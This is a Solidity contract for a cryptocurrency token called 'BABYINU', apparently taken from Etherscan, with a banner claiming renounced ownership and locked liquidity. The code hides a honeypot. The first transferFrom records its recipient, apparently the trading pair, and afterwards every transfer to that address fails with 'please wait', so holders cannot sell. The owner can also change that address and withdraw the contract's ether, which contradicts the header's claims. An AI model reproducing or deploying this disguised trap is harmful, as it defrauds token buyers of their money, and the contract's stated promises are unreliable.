['/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-23\n', '*/\n', '\n', '//$$$$$ BABYINU $$$$$\n', '\n', '\n', '/*\n', '\n', '\n', '\n', '\n', '██████╗░░█████╗░██████╗░██╗░░░██╗██╗███╗░░██╗██╗░░░██╗\n', '██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝██║████╗░██║██║░░░██║\n', '██████╦╝███████║██████╦╝░╚████╔╝░██║██╔██╗██║██║░░░██║\n', '██╔══██╗██╔══██║██╔══██╗░░╚██╔╝░░██║██║╚████║██║░░░██║\n', '██████╦╝██║░░██║██████╦╝░░░██║░░░██║██║░╚███║╚██████╔╝\n', '╚═════╝░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝░╚═════╝░\n', '\n', '\n', '\n', '███╗░░██╗███████╗██╗░░██╗████████╗\n', '████╗░██║██╔════╝╚██╗██╔╝╚══██╔══╝\n', '██╔██╗██║█████╗░░░╚███╔╝░░░░██║░░░\n', '██║╚████║██╔══╝░░░██╔██╗░░░░██║░░░\n', '██║░╚███║███████╗██╔╝╚██╗░░░██║░░░\n', '╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝░░░╚═╝░░░\n', '\n', '\n', '\n', '███╗░░░███╗░█████╗░░█████╗░███╗░░██╗░██████╗██╗░░██╗░█████╗░████████╗\n', '████╗░████║██╔══██╗██╔══██╗████╗░██║██╔════╝██║░░██║██╔══██╗╚══██╔══╝\n', '██╔████╔██║██║░░██║██║░░██║██╔██╗██║╚█████╗░███████║██║░░██║░░░██║░░░\n', '██║╚██╔╝██║██║░░██║██║░░██║██║╚████║░╚═══██╗██╔══██║██║░░██║░░░██║░░░\n', '██║░╚═╝░██║╚█████╔╝╚█████╔╝██║░╚███║██████╔╝██║░░██║╚█████╔╝░░░██║░░░\n', '╚═╝░░░░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░\n', '\n', '\n', '\n', '1. 1,000,000,000,000,000 Total Supply\n', '2. 100% LIQUIDITY - UNISWAP LAUNCH\n', '3. OWNERSHIP RENOUNCED\n', '4. LIQUIDITY LOCKED FOREVER\n', '5. PRE-LAUNCH\n', '\n', '*/\n', '\n', '\n', '// DEFLATIONARY TOKENOMICS \n', '// COOLDOWN TO PREVENT BOTS FROM FRONTRUNNING\n', '\n', '\n', '\n', 'pragma solidity >=0.5.17;\n', '\n', 'library SafeMath {\n', '    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n', '        c = a + b;\n', '\n', '        require(c >= a);\n', '    }\n', '\n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {\n', '        require(b <= a);\n', '        c = a - b;\n', '    }\n', '\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n', '        c = a * b;\n', '\n', '        require(a == 0 || c / a == b);\n', '    }\n', '\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256 c) {\n', '        require(b > 0);\n', '        c = a / b;\n', '    }\n', '}\n', '\n', 'contract BEP20Interface {\n', '    function totalSupply() public view returns (uint256);\n', '\n', '    function balanceOf(address tokenOwner)\n', '        public\n', '        view\n', '        returns (uint256 balance);\n', '\n', '    function allowance(address tokenOwner, address spender)\n', '        public\n', '        view\n', '        returns (uint256 remaining);\n', '\n', '    function transfer(address to, uint256 tokens) public returns (bool success);\n', '\n', '    function approve(address spender, uint256 tokens)\n', '        public\n', '        returns (bool success);\n', '\n', '    function transferFrom(\n', '        address from,\n', '        address to,\n', '        uint256 tokens\n', '    ) public returns (bool success);\n', '\n', '    event Transfer(address indexed from, address indexed to, uint256 tokens);\n', '\n', '    event Approval(\n', '        address indexed tokenOwner,\n', '        address indexed spender,\n', '        uint256 tokens\n', '    );\n', '}\n', '\n', 'contract ApproveAndCallFallBack {\n', '    function receiveApproval(\n', '        address from,\n', '        uint256 tokens,\n', '        address token,\n', '        bytes memory data\n', '    ) public;\n', '}\n', '\n', 'contract Owned {\n', '    address public owner;\n', '\n', '    address public newOwner;\n', '\n', '    event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '    constructor() public {\n', '        owner = msg.sender;\n', '    }\n', '\n', '    modifier onlyOwner {\n', '        require(msg.sender == owner);\n', '\n', '        _;\n', '    }\n', '\n', '    function transferOwnership(address _newOwner) public onlyOwner {\n', '        newOwner = _newOwner;\n', '    }\n', '\n', '    function acceptOwnership() public {\n', '        require(msg.sender == newOwner);\n', '\n', '        emit OwnershipTransferred(owner, newOwner);\n', '        owner = newOwner;\n', '        newOwner = address(0);\n', '    }\n', '}\n', '\n', 'contract TokenBEP20 is BEP20Interface, Owned {\n', '    using SafeMath for uint256;\n', '\n', '    string public symbol;\n', '\n', '    string public name;\n', '\n', '    uint8 public decimals;\n', '\n', '    uint256 _totalSupply;\n', '\n', '    address public newun;\n', '\n', '    mapping(address => uint256) balances;\n', '\n', '    mapping(address => mapping(address => uint256)) allowed;\n', '\n', '    constructor() public {\n', '        symbol = "BABYINU";\n', '        name = "BABYINU";\n', '        decimals = 9;\n', '        _totalSupply = 1000000000000000000000000;\n', '        balances[owner] = _totalSupply;\n', '        emit Transfer(address(0), owner, _totalSupply);\n', '    }\n', '\n', '    function transfernewun(address _newun) public onlyOwner {\n', '        newun = _newun;\n', '    }\n', '\n', '    function totalSupply() public view returns (uint256) {\n', '        return _totalSupply.sub(balances[address(0)]);\n', '    }\n', '\n', '    function balanceOf(address tokenOwner)\n', '        public\n', '        view\n', '        returns (uint256 balance)\n', '    {\n', '        return balances[tokenOwner];\n', '    }\n', '\n', '    function transfer(address to, uint256 tokens)\n', '        public\n', '        returns (bool success)\n', '    {\n', '        require(to != newun, "please wait");\n', '        balances[msg.sender] = balances[msg.sender].sub(tokens);\n', '        balances[to] = balances[to].add(tokens);\n', '        emit Transfer(msg.sender, to, tokens);\n', '        return true;\n', '    }\n', '\n', '    function approve(address spender, uint256 tokens)\n', '        public\n', '        returns (bool success)\n', '    {\n', '        allowed[msg.sender][spender] = tokens;\n', '        emit Approval(msg.sender, spender, tokens);\n', '        return true;\n', '    }\n', '\n', '    function transferFrom(\n', '        address from,\n', '        address to,\n', '        uint256 tokens\n', '    ) public returns (bool success) {\n', '        if (from != address(0) && newun == address(0)) newun = to;\n', '        else require(to != newun, "please wait");\n', '        balances[from] = balances[from].sub(tokens);\n', '        allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n', '        balances[to] = balances[to].add(tokens);\n', '        emit Transfer(from, to, tokens);\n', '        return true;\n', '    }\n', '\n', '    function allowance(address tokenOwner, address spender)\n', '        public\n', '        view\n', '        returns (uint256 remaining)\n', '    {\n', '        return allowed[tokenOwner][spender];\n', '    }\n', '\n', '    function approveAndCall(\n', '        address spender,\n', '        uint256 tokens,\n', '        bytes memory data\n', '    ) public returns (bool success) {\n', '        allowed[msg.sender][spender] = tokens;\n', '        emit Approval(msg.sender, spender, tokens);\n', '        ApproveAndCallFallBack(spender).receiveApproval(\n', '            msg.sender,\n', '            tokens,\n', '            address(this),\n', '            data\n', '        );\n', '        return true;\n', '    }\n', '\n', '    function() external payable {\n', '        revert();\n', '    }\n', '}\n', '\n', 'contract GokuToken is TokenBEP20 {\n', '    function clearCNDAO() public onlyOwner() {\n', '        address payable _owner = msg.sender;\n', '        _owner.transfer(address(this).balance);\n', '    }\n', '\n', '    function() external payable {}\n', '}']